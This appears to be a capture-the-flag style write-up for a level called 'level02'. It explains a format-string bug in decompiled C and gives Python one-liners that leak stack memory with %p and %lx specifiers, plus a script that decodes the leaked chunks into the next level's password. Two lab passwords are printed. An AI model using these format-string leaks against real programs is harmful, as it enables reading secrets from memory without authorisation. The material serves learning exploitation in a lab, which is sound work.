# level02 notes

The important part is here:

FILE* fp = fopen("/home/users/level03/.pass", "r");
fread(&buf_1, 1, 0x29, fp);

if (!strncmp(&buf_1, &buf, 0x29))
{
    printf("Greetings, %s!\n", &var_78);
    system("/bin/sh");
}

printf(&var_78);

What this means

The program:

-opens `/home/users/level03/.pass`;
-reads the password into `buf_1`;
-asks for username;
-asks for password;
-if the password is wrong, it does:

printf(&var_78);

Summary for `level02`

The vulnerability is:
printf(&var_78);

It should have been:
printf("%s", &var_78);

Exploit logic:

Use username as format string
→ leak stack values with %lx
→ find the chunks containing /home/users/level03/.pass
→ reverse each 8-byte chunk because little-endian
→ reconstruct level03 password
→ su level03

1. Copy level02 binary file to host machine
scp -P 7777 level02@127.0.0.1:/home/users/level02/level02 ./Lien-Override/BinaryfromISO/level02

2. ssh level02@127.0.0.1 -p 7777 OR su level02
Enter password of level02: 
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv

3. First leak stack values

(python -c 'print "%p " * 40; print "A"') | ./level02

Explanation:
first line  = username = "%p %p %p ..."
second line = password = "A"

The password is intentionally wrong, so the program reaches:
printf(username);

You should get many values like:
0x7fffffffe500 0x0 0x64 0x2a2a2a2a ...

Among them, look for values that look like ASCII when decoded, for example values beginning with:
0x48
0x50
0x41
0x6e
0x75

4. Cleaner leak with indexed positions

Use positional format specifiers:

(python -c 'print " ".join(["%%%d$lx" % i for i in range(1, 45)]); print "A"') | ./level02

This prints:
%1$lx %2$lx %3$lx ... %44$lx

For this level, the useful values are often around:

%22$lx
%23$lx
%24$lx
%25$lx
%26$lx

So test directly:
(python -c 'print "%22$lx %23$lx %24$lx %25$lx %26$lx"; print "A"') | ./level02

5. Why the output looks reversed

The binary is 64-bit little-endian.

So if the stack leaks:
756e505234376848

the real text is obtained by reversing the bytes:
75 6e 50 52 34 37 68 48

becomes:
48 68 37 34 52 50 6e 75

which is:
Hh74RPnu

6. Decode leaked chunks

Suppose you get chunks like this:
756e505234376848
45414a3561733951
377a7143574e6758
354a35686e475873
48336750664b394d

Decode them with Python 2 in the VM:
python - << 'EOF'
chunks = [
    "756e505234376848",
    "45414a3561733951",
    "377a7143574e6758",
    "354a35686e475873",
    "48336750664b394d",
]

password = ""
for c in chunks:
    password += c.decode("hex")[::-1]

print password
EOF

That will print the reconstructed password of level03:
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H

7. Then login to level03
Once we have the password:
su level03
Paste the password.
